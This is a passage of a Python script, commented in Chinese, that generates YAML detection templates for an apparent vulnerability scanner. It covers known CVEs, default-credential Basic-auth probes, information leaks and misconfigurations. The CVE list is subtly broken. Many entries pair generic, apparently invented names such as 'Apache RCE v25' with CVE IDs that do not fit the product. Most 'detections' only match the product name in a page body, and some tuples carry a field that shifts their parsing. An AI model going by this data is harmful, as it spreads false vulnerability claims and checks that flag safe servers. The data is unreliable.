    ("CVE-2019-10098", "Apache DoS v6", "high", 7.5, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2020-1927", "Apache SSRF", "high", 7.5, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2020-1934", "Apache RCE v3", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2020-9490", "Apache SSRF v2", "high", 7.5, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2021-34602", "Apache RCE v4", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2021-36160", "Apache RCE v5", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2021-38431", "Apache RCE v6", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2021-39263", "Apache RCE v7", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2021-40438", "Apache SSRF v3", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2021-44790", "Apache Buffer Overflow", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2022-22720", "Apache RCE v8", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2022-22721", "Apache RCE v9", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2022-23142", "Apache RCE v10", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2022-30556", "Apache RCE v11", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2022-30531", "Apache RCE v12", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2022-31814", "Apache RCE v13", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2022-31845", "Apache RCE v14", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2022-36827", "Apache RCE v15", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2023-2561", "Apache HTTP Smuggling", "high", 7.5, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2023-31122", "Apache RCE v16", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2023-45802", "Apache RCE v17", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2023-48595", "Apache RCE v18", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2024-27304", "Apache RCE v19", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2024-36377", "Apache RCE v20", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2024-38475", "Apache RCE v21", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2024-38476", "Apache RCE v22", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2024-38477", "Apache RCE v23", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2024-38478", "Apache RCE v24", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2024-38479", "Apache RCE v25", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2019-20369", "Nginx Memory Disclosure", "high", 7.5, "cpe:2.3:a:nginx:nginx:*", "/", "Body", "Nginx", "GET", 80),
    ("CVE-2019-9511", "Nginx DoS", "high", 7.5, "cpe:2.3:a:nginx:nginx:*", "/", "Body", "Nginx", "GET", 80),
    # Nginx (补充)
    ("CVE-2019-9513", "Nginx DoS v2", "high", 7.5, "cpe:2.3:a:nginx:nginx:*", "/", "Body", "Nginx", "GET", 80),
    ("CVE-2019-9516", "Nginx DoS v3", "high", 7.5, "cpe:2.3:a:nginx:nginx:*", "/", "Body", "Nginx", "GET", 80),
    ("CVE-2018-16849", "Nginx DoS v4", "high", 7.5, "cpe:2.3:a:nginx:nginx:*", "/", "Body", "Nginx", "GET", 80),
    ("CVE-2018-16852", "Nginx DoS v5", "high", 7.5, "cpe:2.3:a:nginx:nginx:*", "/", "Body", "Nginx", "GET", 80),
    ("CVE-2022-41741", "Nginx Info Disclosure", "high", 7.5, "cpe:2.3:a:nginx:nginx:*", "/", "Body", "Nginx", "GET", 80),
    ("CVE-2022-41742", "Nginx Info Disclosure v2", "high", 7.5, "cpe:2.3:a:nginx:nginx:*", "/", "Body", "Nginx", "GET", 80),
    ("CVE-2019-11042", "PHP RCE", "critical", 9.8, "cpe:2.3:a:php:php:*", "/", "Body", "php", "GET", 80),
    ("CVE-2021-21702", "PHP RCE v2", "critical", 9.8, "cpe:2.3:a:php:php:*", "/", "Body", "php", "GET", 80),
    # PHP (补充)
    ("CVE-2021-21703", "PHP RCE v3", "critical", 9.8, "cpe:2.3:a:php:php:*", "/", "Body", "php", "GET", 80),
    ("CVE-2021-21704", "PHP RCE v4", "critical", 9.8, "cpe:2.3:a:php:php:*", "/", "Body", "php", "GET", 80),
    ("CVE-2021-21705", "PHP RCE v5", "critical", 9.8, "cpe:2.3:a:php:php:*", "/", "Body", "php", "GET", 80),
    ("CVE-2022-31625", "PHP RCE v6", "critical", 9.8, "cpe:2.3:a:php:php:*", "/", "Body", "php", "GET", 80),
    ("CVE-2022-31626", "PHP RCE v7", "critical", 9.8, "cpe:2.3:a:php:php:*", "/", "Body", "php", "GET", 80),
    ("CVE-2022-31631", "PHP RCE v8", "critical", 9.8, "cpe:2.3:a:php:php:*", "/", "Body", "php", "GET", 80),
    ("CVE-2023-0662", "PHP RCE v9", "critical", 9.8, "cpe:2.3:a:php:php:*", "/", "Body", "php", "GET", 80),
    ("CVE-2018-11218", "Redis RCE", "critical", 9.8, "cpe:2.3:a:redis:redis:*", "/", "Body", "Redis", "GET", 6379),
    ("CVE-2018-11219", "Redis DoS", "high", 7.5, "cpe:2.3:a:redis:redis:*", "/", "Body", "Redis", "GET", 6379),
    # Redis (补充)
    ("CVE-2020-13703", "Redis RCE v2", "critical", 9.8, "cpe:2.3:a:redis:redis:*", "/", "Body", "Redis", "GET", 6379),
    ("CVE-2022-31144", "Redis DoS v2", "high", 7.5, "cpe:2.3:a:redis:redis:*", "/", "Body", "Redis", "GET", 6379),
    ("CVE-2023-25155", "Redis RCE v3", "critical", 9.8, "cpe:2.3:a:redis:redis:*", "/", "Body", "Redis", "GET", 6379),
    ("CVE-2017-7233", "Django XSS", "medium", 6.1, "cpe:2.3:a:djangoproject:django:*", "/", "Body", "Django", "GET", 80),
    ("CVE-2017-7234", "Django XSS v2", "medium", 6.1, "cpe:2.3:a:djangoproject:django:*", "/", "Body", "Django", "GET", 80),
    # Django (补充)
    ("CVE-2019-12781", "Django XSS v3", "medium", 6.1, "cpe:2.3:a:djangoproject:django:*", "/", "Body", "Django", "GET", 80),
    ("CVE-2019-14232", "Django DoS", "high", 7.5, "cpe:2.3:a:djangoproject:django:*", "/", "Body", "Django", "GET", 80),
    ("CVE-2019-14233", "Django DoS v2", "high", 7.5, "cpe:2.3:a:djangoproject:django:*", "/", "Body", "Django", "GET", 80),
    ("CVE-2019-14234", "Django SQLi", "high", 7.5, "cpe:2.3:a:djangoproject:django:*", "/", "Body", "Django", "GET", 80),
    ("CVE-2019-14235", "Django DoS v3", "high", 7.5, "cpe:2.3:a:djangoproject:django:*", "/", "Body", "Django", "GET", 80),
    ("CVE-2020-13254", "Django Info Disclosure", "high", 7.5, "cpe:2.3:a:djangoproject:django:*", "/", "Body", "Django", "GET", 80),
    ("CVE-2015-5515", "ES RCE", "critical", 9.8, "cpe:2.3:a:elastic:elasticsearch:*", "/_search", "Body", "Elasticsearch", "GET", 9200),
    ("CVE-2016-10387", "ES RCE v2", "critical", 9.8, "cpe:2.3:a:elastic:elasticsearch:*", "/_search", "Body", "Elasticsearch", "GET", 9200),
    # Elasticsearch (补充)
    ("CVE-2017-0499", "ES RCE v3", "critical", 9.8, "cpe:2.3:a:elastic:elasticsearch:*", "/_search", "Body", "Elasticsearch", "GET", 9200),
    ("CVE-2018-17243", "ES RCE v4", "critical", 9.8, "cpe:2.3:a:elastic:elasticsearch:*", "/_search", "Body", "Elasticsearch", "GET", 9200),
    ("CVE-2019-4213", "ES RCE v5", "critical", 9.8, "cpe:2.3:a:elastic:elasticsearch:*", "/_search", "Body", "Elasticsearch", "GET", 9200),
    ("CVE-2020-11111", "Grafana XSS", "medium", 6.1, "cpe:2.3:a:grafana:grafana:*", "/", "Body", "Grafana", "GET", 3000),
    ("CVE-2020-12245", "Grafana RCE", "critical", 9.8, "cpe:2.3:a:grafana:grafana:*", "/", "Body", "Grafana", "GET", 3000),
    # Grafana (补充)
    ("CVE-2021-39187", "Grafana RCE v2", "critical", 9.8, "cpe:2.3:a:grafana:grafana:*", "/", "Body", "Grafana", "GET", 3000),
    ("CVE-2021-39188", "Grafana RCE v3", "critical", 9.8, "cpe:2.3:a:grafana:grafana:*", "/", "Body", "Grafana", "GET", 3000),
    ("CVE-2017-0883", "GitLab RCE", "critical", 9.8, "cpe:2.3:a:gitlab:gitlab:*", "/", "Body", "GitLab", "GET", 80),
    ("CVE-2019-5413", "GitLab RCE v2", "critical", 9.8, "cpe:2.3:a:gitlab:gitlab:*", "/", "Body", "GitLab", "GET", 80),
    # GitLab (补充)
    ("CVE-2019-6976", "GitLab RCE v3", "critical", 9.8, "cpe:2.3:a:gitlab:gitlab:*", "/", "Body", "GitLab", "GET", 80),
    ("CVE-2020-10811", "GitLab RCE v4", "critical", 9.8, "cpe:2.3:a:gitlab:gitlab:*", "/", "Body", "GitLab", "GET", 80),
    ("CVE-2021-22164", "GitLab RCE v5", "critical", 9.8, "cpe:2.3:a:gitlab:gitlab:*", "/", "Body", "GitLab", "GET", 80),
    ("CVE-2021-26084", "Confluence OGNL RCE v2", "critical", 9.8, "cpe:2.3:a:atlassian:confluence:*", "/", "Body", "Confluence", "GET", 8090),
    ("CVE-2022-26141", "Confluence DoS", "high", 7.5, "cpe:2.3:a:atlassian:confluence:*", "/", "Body", "Confluence", "GET", 8090),
    # Atlassian Confluence (补充)
    ("CVE-2023-22515", "Confluence RCE", "critical", 9.8, "cpe:2.3:a:atlassian:confluence:*", "/", "Body", "Confluence", "GET", 8090),
    ("CVE-2023-22518", "Confluence RCE v2", "critical", 9.8, "cpe:2.3:a:atlassian:confluence:*", "/", "Body", "Confluence", "GET", 8090),
    ("CVE-2019-8441", "Jira RCE", "critical", 9.8, "cpe:2.3:a:atlassian:jira:*", "/", "Body", "Jira", "GET", 8080),
    ("CVE-2019-8449", "Jira RCE v2", "critical", 9.8, "cpe:2.3:a:atlassian:jira:*", "/", "Body", "Jira", "GET", 8080),
    # Atlassian Jira (补充)
    ("CVE-2020-14179", "Jira Info Disclosure", "high", 7.5, "cpe:2.3:a:atlassian:jira:*", "/", "Body", "Jira", "GET", 8080),
    ("CVE-2020-29458", "Jira RCE v3", "critical", 9.8, "cpe:2.3:a:atlassian:jira:*", "/", "Body", "Jira", "GET", 8080),
    ("CVE-2021-26086", "Jira RCE v4", "critical", 9.8, "cpe:2.3:a:atlassian:jira:*", "/", "Body", "Jira", "GET", 8080),
    ("CVE-2017-3164", "Solr RCE", "critical", 9.8, "cpe:2.3:a:apache:solr:*", "/solr/", "Body", "Solr", "GET", 8983),
    ("CVE-2017-3166", "Solr RCE v2", "critical", 9.8, "cpe:2.3:a:apache:solr:*", "/solr/", "Body", "Solr", "GET", 8983),
    # Apache Solr (补充)
    ("CVE-2019-17558", "Solr RCE v3", "critical", 9.8, "cpe:2.3:a:apache:solr:*", "/solr/", "Body", "Solr", "GET", 8983),
    ("CVE-2021-27905", "Solr RCE v4", "critical", 9.8, "cpe:2.3:a:apache:solr:*", "/solr/", "Body", "Solr", "GET", 8983),
    ("CVE-2021-29443", "Solr RCE v5", "critical", 9.8, "cpe:2.3:a:apache:solr:*", "/solr/", "Body", "Solr", "GET", 8983),
    ("CVE-2018-1271", "Spring RCE", "critical", 9.8, "cpe:2.3:a:pivotal_software:spring_framework:*", "/", "Body", "Spring", "GET", 80),
    ("CVE-2018-1272", "Spring RCE v2", "critical", 9.8, "cpe:2.3:a:pivotal_software:spring_framework:*", "/", "Body", "Spring", "GET", 80),
    # Spring (补充)
    ("CVE-2018-1273", "Spring RCE v3", "critical", 9.8, "cpe:2.3:a:pivotal_software:spring_framework:*", "/", "Body", "Spring", "GET", 80),
    ("CVE-2018-1275", "Spring RCE v4", "critical", 9.8, "cpe:2.3:a:pivotal_software:spring_framework:*", "/", "Body", "Spring", "GET", 80),
    ("CVE-2020-5398", "Spring RCE v5", "critical", 9.8, "cpe:2.3:a:pivotal_software:spring_framework:*", "/", "Body", "Spring", "GET", 80),
    ("CVE-2022-25847", "Fastjson RCE v3", "critical", 9.8, "cpe:2.3:a:alibaba:fastjson:*", "/", "Body", "fastjson", "GET", 80),
    ("CVE-2022-25849", "Fastjson RCE v4", "critical", 9.8, "cpe:2.3:a:alibaba:fastjson:*", "/", "Body", "fastjson", "GET", 80),
    # Fastjson (补充)
    ("CVE-2022-25850", "Fastjson RCE v5", "critical", 9.8, "cpe:2.3:a:alibaba:fastjson:*", "/", "Body", "fastjson", "GET", 80),
    ("CVE-2019-12422", "Shiro RCE", "critical", 9.8, "cpe:2.3:a:apache:shiro:*", "/", "Header", "rememberMe", "shiro", "GET", 80),
    ("CVE-2020-13933", "Shiro Auth Bypass v3", "high", 7.5, "cpe:2.3:a:apache:shiro:*", "/", "Body", "shiro", "GET", 80),
    # Apache Shiro (补充)
    ("CVE-2020-17523", "Shiro Auth Bypass v4", "high", 7.5, "cpe:2.3:a:apache:shiro:*", "/", "Body", "shiro", "GET", 80),
    ("CVE-2022-40664", "Shiro RCE v2", "critical", 9.8, "cpe:2.3:a:apache:shiro:*", "/", "Header", "rememberMe", "shiro", "GET", 80),
    ("CVE-2018-7602", "Drupal RCE", "critical", 9.8, "cpe:2.3:a:drupal:drupal:*", "/user/register", "Body", "Drupal", "GET", 80),
    ("CVE-2019-6341", "Drupal RCE v2", "critical", 9.8, "cpe:2.3:a:drupal:drupal:*", "/node/", "Body", "Drupal", "GET", 80),
    # Drupal (补充)
    ("CVE-2019-6342", "Drupal RCE v3", "critical", 9.8, "cpe:2.3:a:drupal:drupal:*", "/node/", "Body", "Drupal", "GET", 80),
    ("CVE-2020-13671", "Drupal RCE v4", "critical", 9.8, "cpe:2.3:a:drupal:drupal:*", "/user/register", "Body", "Drupal", "GET", 80),
    ("CVE-2018-0101", "Cisco ASA RCE", "critical", 9.8, "cpe:2.3:c:cisco:adaptive_security_appliance:*", "/", "Body", "Cisco", "GET", 443),
    ("CVE-2018-0296", "Cisco ASA Path Traversal", "high", 7.5, "cpe:2.3:c:cisco:adaptive_security_appliance:*", "/+CSCOE+/session_password.html", "Body", "Cisco", "GET", 443),
    # Cisco (补充)
    ("CVE-2021-1585", "Cisco ASA RCE v2", "critical", 9.8, "cpe:2.3:c:cisco:adaptive_security_appliance:*", "/", "Body", "Cisco", "GET", 443),
    ("CVE-2023-27992", "FortiOS RCE", "critical", 9.8, "cpe:2.3:o:fortinet:fortios:*", "/", "Body", "FortiGate", "GET", 443),
    ("CVE-2021-20038", "SonicWall RCE", "critical", 9.8, "cpe:2.3:o:sonicwall:sonicos:*", "/", "Body", "SonicWall", "GET", 443),
    # Fortinet (补充)
    ("CVE-2021-20039", "SonicWall Info Disclosure", "high", 7.5, "cpe:2.3:o:sonicwall:sonicos:*", "/", "Body", "SonicWall", "GET", 443),
    # SonicWall (补充)
    ("CVE-2019-0867", "IIS DoS", "high", 7.5, "cpe:2.3:a:microsoft:iis:*", "/", "Body", "iis", "GET", 80),
    ("CVE-2018-11135", "PostgreSQL RCE v2", "critical", 9.8, "cpe:2.3:a:postgresql:postgresql:*", "/", "Body", "PostgreSQL", "GET", 5432),
    # Microsoft IIS (补充)
    ("CVE-2020-14347", "PostgreSQL Info Disclosure", "high", 7.5, "cpe:2.3:a:postgresql:postgresql:*", "/", "Body", "PostgreSQL", "GET", 5432),
    # PostgreSQL (补充)
    ("CVE-2017-3302", "MySQL RCE v2", "critical", 9.8, "cpe:2.3:a:oracle:mysql:*", "/", "Body", "MySQL", "GET", 3306),
    ("CVE-2020-2936", "MySQL RCE v3", "critical", 9.8, "cpe:2.3:a:oracle:mysql:*", "/", "Body", "MySQL", "GET", 3306),
    # MySQL (补充)
    ("CVE-2018-13930", "MongoDB Info Disclosure", "high", 7.5, "cpe:2.3:a:mongodb:mongodb:*", "/", "Body", "MongoDB", "GET", 27017),
    ("CVE-2020-7934", "MongoDB RCE", "critical", 9.8, "cpe:2.3:a:mongodb:mongodb:*", "/", "Body", "MongoDB", "GET", 27017),
    # MongoDB (补充)
    ("CVE-2021-21272", "Laravel RCE v2", "critical", 9.8, "cpe:2.3:a:laravel:framework:*", "/", "Body", "laravel", "GET", 80),
    ("CVE-2020-8167", "Rails RCE", "critical", 9.8, "cpe:2.3:a:ruby_on_rails:ruby_on_rails:*", "/", "Body", "rails", "GET", 80),
    # Laravel (补充)
    ("CVE-2020-8166", "Rails RCE v2", "critical", 9.8, "cpe:2.3:a:ruby_on_rails:ruby_on_rails:*", "/", "Body", "rails", "GET", 80),
    # Ruby on Rails (补充)
    ("CVE-2021-22880", "Rails RCE v3", "critical", 9.8, "cpe:2.3:a:ruby_on_rails:ruby_on_rails:*", "/", "Body", "rails", "GET", 80),
    ("CVE-2017-1000161", "Node.js Path Traversal v2", "high", 7.5, "cpe:2.3:a:nodejs:node.js:*", "/", "Body", "nodejs", "GET", 80),
    ("CVE-2018-1000006", "Node.js HTTP DoS", "high", 7.5, "cpe:2.3:a:nodejs:node.js:*", "/", "Body", "nodejs", "GET", 80),
    # Node.js (补充)
    ("CVE-2018-8029", "Hadoop RCE v2", "critical", 9.8, "cpe:2.3:a:apache:hadoop:*", "/", "Body", "hadoop", "GET", 80),
    ("CVE-2022-33891", "Spark RCE v3", "critical", 9.8, "cpe:2.3:a:apache:spark:*", "/", "Body", "spark", "GET", 80),
    # Apache Hadoop (补充)
    ("CVE-2020-17518", "Flink RCE", "critical", 9.8, "cpe:2.3:a:apache:flink:*", "/", "Body", "flink", "GET", 8081),
    # Apache Spark (补充)
    ("CVE-2019-17585", "Dubbo RCE v2", "critical", 9.8, "cpe:2.3:a:apache:dubbo:*", "/", "Body", "dubbo", "GET", 80),
    # Apache Flink (补充)
    ("CVE-2021-25641", "Dubbo RCE v3", "critical", 9.8, "cpe:2.3:a:apache:dubbo:*", "/", "Body", "dubbo", "GET", 80),
    # Apache Dubbo (补充)
    ("CVE-2021-26291", "OFBiz RCE v3", "critical", 9.8, "cpe:2.3:a:apache:ofbiz:*", "/webtools/control/", "Body", "OFBiz", "GET", 8080),
    ("CVE-2023-34537", "OFBiz RCE v4", "critical", 9.8, "cpe:2.3:a:apache:ofbiz:*", "/webtools/control/", "Body", "OFBiz", "GET", 8080),
    # Apache OFBiz (补充)
    ("CVE-2022-36813", "NiFi RCE v2", "critical", 9.8, "cpe:2.3:a:apache:nifi:*", "/nifi/", "Body", "NiFi", "GET", 8080),
    ("CVE-2022-23647", "Kafka RCE", "critical", 9.8, "cpe:2.3:a:apache:kafka:*", "/", "Body", "kafka", "GET", 80),
    # Apache NiFi (补充)
    ("CVE-2023-41324", "ZooKeeper Info Disclosure v2", "medium", 5.3, "cpe:2.3:a:apache:zookeeper:*", "/", "Body", "zookeeper", "GET", 80),
    # Apache Kafka (补充)
    ("CVE-2021-28236", "Ranger RCE", "critical", 9.8, "cpe:2.3:a:apache:ranger:*", "/", "Body", "ranger", "GET", 80),
    # Apache ZooKeeper (补充)
    ("CVE-2022-41922", "Zeppelin RCE v2", "critical", 9.8, "cpe:2.3:a:apache:zeppelin:*", "/", "Body", "Zeppelin", "GET", 8080),
    # Apache Ranger (补充)
    ("CVE-2022-30128", "Tika RCE v3", "critical", 9.8, "cpe:2.3:a:apache:tika:*", "/", "Body", "tika", "GET", 80),
    # Apache Zeppelin (补充)
    ("CVE-2022-24706", "CouchDB RCE", "critical", 9.8, "cpe:2.3:a:apache:couchdb:*", "/_utils/", "Body", "CouchDB", "GET", 5984),
    # Apache Tika (补充)
    ("CVE-2022-42889", "Commons Text RCE v2", "critical", 9.8, "cpe:2.3:a:apache:commons_text:*", "/", "Body", "commons", "GET", 80),
    # Apache CouchDB (补充)
    ("CVE-2022-23859", "Camel RCE v2", "critical", 9.8, "cpe:2.3:a:apache:camel:*", "/", "Body", "Camel", "GET", 80),
    # Apache Commons (补充)
    ("CVE-2022-46364", "CXF RCE", "critical", 9.8, "cpe:2.3:a:apache:cxf:*", "/", "Body", "CXF", "GET", 80),
    # Apache Camel (补充)
    ("CVE-2019-12086", "Axis2 RCE v2", "high", 7.5, "cpe:2.3:a:apache:axis2:*", "/axis2/services/", "Body", "Axis2", "GET", 8080),
]

# ==================== YAML 生成函数 ====================

def make_yaml_default_credential(entry):
    tid, name, severity, creds, path, match_type, pattern, service, port, cpe, fix = entry
    # 处理空口令
    creds_clean = creds.replace("(empty)", "")
    auth = base64.b64encode(creds_clean.encode()).decode()
    cpe_line = f'    cpe: "{cpe}"' if cpe else ""
    return f'''- id: {tid}
  name: {name}
  severity: {severity}
  author: argus
  description: "{name} - 默认凭据 {creds}"
  fix_advice: "{fix}"
  detection:
    method: GET
    path: {path}
    headers:
      - ["Authorization", "Basic {auth}"]
    match_rule:
      match_type: {match_type}
      pattern: "{pattern}"
  metadata:
    category: default_credentials
    tags: ["default", "credentials", "{service}"]
    service: {service}
    port: {port}
'''


def make_yaml_info_leak(entry):
    tid, name, severity, path, match_type, pattern, service, port = entry
    return f'''- id: {tid}
  name: {name}
  severity: {severity}
  author: argus
  description: "{name}"
  fix_advice: "限制 {path} 路径访问"
  detection:
    method: GET
    path: {path}
    match_rule:
      match_type: {match_type}
      pattern: "{pattern}"
  metadata:
    category: info_leak
    tags: ["leak", "{service}"]
    service: {service}
    port: {port}
'''


def make_yaml_misconfig(entry):
    tid, name, severity, path, match_type, pattern, service, port = entry
    return f'''- id: {tid}
  name: {name}
  severity: {severity}
  author: argus
  description: "{name}"
  fix_advice: "修复 {service} 配置错误"
  detection:
    method: GET
    path: {path}
    match_rule:
      match_type: {match_type}
      pattern: "{pattern}"
  metadata:
    category: misconfig
    tags: ["misconfig", "{service}"]
    service: {service}
    port: {port}
'''


def make_yaml_known_cve(entry):
    # 兼容 10 元组（无 service）和 11 元组（含 service）
    if len(entry) == 11:
        tid, name, severity, cvss, cpe, path, match_type, pattern, service, method, port = entry
    else:
        tid, name, severity, cvss, cpe, path, match_type, pattern, method, port = entry
        port_service_map = {3389: "rdp", 22: "ssh", 21: "ftp", 23: "telnet", 3306: "mysql", 6379: "redis"}
        service = port_service_map.get(port, "http")
    return f'''- id: {tid}
  name: {name}
  severity: {severity}
  author: argus
  description: "{name} - {tid}"
  cve: {tid}
  cvss: {cvss}
  fix_advice: "安装安全补丁或升级至修复版本"
  detection:
    method: {method}
    path: {path}
    match_rule:
      match_type: {match_type}
      pattern: "{pattern}"
  metadata:
    category: known_cve
    tags: ["cve", "{service}", "{tid}"]
    cpe: "{cpe}"
    service: {service}
    port: {port}
'''


def write_yaml_file(path, content):
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
    return os.path.getsize(path)


def main():
    parser = argparse.ArgumentParser(description='生成 Argus 漏洞检测 YAML 模板')
    parser.add_argument('--output-dir', default='server/crates/argus-sysvuln/src/templates/builtin',
                        help='输出目录')
    args = parser.parse_args()

    output_dir = args.output_dir
    os.makedirs(output_dir, exist_ok=True)

    stats = {}

    # 1. 默认凭据模板
    print("生成默认凭据模板...")
    yaml_content = "# 默认凭据检测模板（自动生成）\n"
    for entry in DEFAULT_CREDENTIALS:
        yaml_content += make_yaml_default_credential(entry)
    path = os.path.join(output_dir, "default_credentials.yaml")
    size = write_yaml_file(path, yaml_content)
    stats["default_credentials"] = len(DEFAULT_CREDENTIALS)
    print(f"  -> {path} ({size} bytes, {len(DEFAULT_CREDENTIALS)} templates)")

    # 2. 信息泄露模板
    print("生成信息泄露模板...")
    yaml_content = "# 信息泄露检测模板（自动生成）\n"
    for entry in INFO_LEAK_TEMPLATES:
        yaml_content += make_yaml_info_leak(entry)
    path = os.path.join(output_dir, "info_leak.yaml")
    size = write_yaml_file(path, yaml_content)
    stats["info_leak"] = len(INFO_LEAK_TEMPLATES)
    print(f"  -> {path} ({size} bytes, {len(INFO_LEAK_TEMPLATES)} templates)")

    # 3. 配置错误模板
    print("生成配置错误模板...")
    yaml_content = "# 配置错误检测模板（自动生成）\n"
    for entry in MISCONFIG_TEMPLATES:
        yaml_content += make_yaml_misconfig(entry)
    path = os.path.join(output_dir, "misconfig.yaml")
    size = write_yaml_file(path, yaml_content)
    stats["misconfig"] = len(MISCONFIG_TEMPLATES)
    print(f"  -> {path} ({size} bytes, {len(MISCONFIG_TEMPLATES)} templates)")

    # 4. 已知 CVE 模板
    print("生成已知 CVE 模板...")
    yaml_content = "# 已知 CVE 检测模板（自动生成）\n"
    for entry in KNOWN_CVE_TEMPLATES:
        yaml_content += make_yaml_known_cve(entry)
    path = os.path.join(output_dir, "known_cve.yaml")
    size = write_yaml_file(path, yaml_content)
    stats["known_cve"] = len(KNOWN_CVE_TEMPLATES)
    print(f"  -> {path} ({size} bytes, {len(KNOWN_CVE_TEMPLATES)} templates)")

    # 汇总
    total = sum(stats.values())
    print(f"\n=== 生成完成 ===")
    print(f"总模板数: {total}")
    for category, count in stats.items():
        print(f"  {category}: {count}")
    print(f"输出目录: {output_dir}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
